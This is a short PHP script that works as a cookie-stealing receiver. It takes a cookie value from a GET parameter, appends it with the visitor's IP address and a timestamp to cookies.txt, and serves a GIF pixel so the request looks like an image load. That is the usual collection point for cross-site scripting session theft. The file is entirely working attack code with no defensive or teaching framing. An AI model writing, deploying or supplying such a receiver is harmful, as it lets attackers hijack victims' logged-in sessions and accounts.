<?php

$cookie = $_GET['cookie'];
$ip     = $_SERVER['REMOTE_ADDR'];
$fecha  = date('Y-m-d H:i:s');

file_put_contents('cookies.txt', "[$fecha] IP: $ip | Cookie: $cookie\n", FILE_APPEND);

header('Content-Type: image/gif');
readfile('pixel.gif');
?>
